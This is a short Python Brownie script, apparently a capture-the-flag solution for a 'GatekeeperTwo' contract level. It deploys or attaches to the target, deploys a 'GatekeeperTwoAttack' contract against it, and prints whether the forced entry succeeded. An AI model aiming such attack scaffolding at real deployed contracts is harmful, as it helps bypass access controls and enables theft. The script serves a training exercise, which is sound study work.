#!/usr/bin/python3
from brownie import GatekeeperTwo, GatekeeperTwoAttack
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def forceEntry(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        contract_address = target.address
        _, attacker = get_account()
    else:
        target = GatekeeperTwo.at(contract_address)

    attacker_contract = GatekeeperTwoAttack.deploy(target, {"from": attacker})
    print(f"{green}Attacker: {red}{attacker}{reset}")
    print(f"{green}tx.origin from target contract: {red}{target.entrant()}{reset}")
    print(f"{green}Entered successfully: {red}{attacker_contract.result()}{reset}")


def main(contract_address=None):
    if contract_address:
        forceEntry(contract_address, get_account())
    else:
        forceEntry()


if __name__ == "__main__":
    main()
